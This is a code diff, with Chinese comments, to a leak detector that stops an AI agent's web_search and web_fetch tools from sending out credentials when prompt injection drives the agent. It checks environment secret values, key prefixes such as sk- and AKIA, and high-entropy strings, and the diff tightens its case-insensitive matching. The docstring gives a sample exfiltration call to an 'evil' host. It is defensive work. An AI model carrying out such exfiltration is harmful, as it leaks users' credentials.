@@ -3,8 +3,9 @@
 提示注入要把数据送出去，最省事的通道就是联网工具本身：``web_search("sk-...")``、``web_fetch("https://evil/?d=<密钥>")``。
 这里只拦能确定是凭证的东西，三类：
 
-1. 当前进程环境里名字像密钥的变量（与 bash 剥离环境变量同一条规则 ``_SECRET_ENV``）的值，按原文和 URL 解码后各查一次；
-   网址的主机名部分不分大小写（域名会被规范成小写，把密钥塞进子域名照样拦）；
+1. 当前进程环境里名字像密钥的变量（与 bash 剥离环境变量同一条规则 ``_SECRET_ENV``）的值，按原文和 URL 解码后各查一次。
+   像密钥的值（16 字符以上，或字母数字混排）不分大小写；字典词式的短值只在网址主机名里不分大小写
+   （域名会被规范成小写，塞进子域名照样拦；别处照原样比，免得常见词误报）；
 2. 常见密钥前缀：``sk-``、``ghp_`` / ``github_pat_``、``glpat-``、``AKIA``、``AIza``、``xox?-``，以及 PEM 私钥头；
 3. 长随机串（只对查询词和没出现过的 URL）：32 字符以上、大小写字母和数字混杂、字符熵高。十六进制串（提交号、哈希）不算，
    它们在正常网址里太常见。
@@ -43,6 +44,10 @@ def _random_looking(s: str) -> bool:
     return kinds == 3 and _entropy(s) >= 4.5
 
 
+def _keylike(v: str) -> bool:
+    return len(v) >= 16 or (any(c.isdigit() for c in v) and any(c.isalpha() for c in v))
+
+
 def secret_values(env: Mapping[str, str] | None = None) -> list[str]:
     env = os.environ if env is None else env
     return [v for k, v in env.items()
@@ -52,11 +57,15 @@ def secret_values(env: Mapping[str, str] | None = None) -> list[str]:
 def leaked(text: str, *, env: Mapping[str, str] | None = None, heuristics: bool = True) -> str | None:
     """返回命中的原因（不含命中内容本身），没命中返回 None。"""
     variants = {text, unquote_plus(text)}
-    # 主机名会被规范成小写：密钥塞进子域名时按不分大小写比对。别处照原样比，
-    # 否则 DB_PASSWORD=Postgres 这类取值会让“postgres 调优”也被当成外传
+    folded = {t.casefold() for t in variants}
     hosts = {m.casefold() for t in variants for m in _HOST.findall(t)}
     for v in secret_values(env):
-        if any(v in t for t in variants) or any(v.casefold() in h for h in hosts):
+        if any(v in t for t in variants):
+            return "包含当前环境里某个密钥变量的值"
+        # 不分大小写：像密钥的值（够长，或字母数字混排）在哪都比，改成小写绕不过去；
+        # 字典词式的短值（DB_PASSWORD=Postgres）只在主机名里比——主机名会被规范成小写，别处比会让“postgres 调优”误报
+        pool = folded if _keylike(v) else hosts
+        if any(v.casefold() in t for t in pool):
             return "包含当前环境里某个密钥变量的值"
     for t in variants:
         if _PREFIXED.search(t):
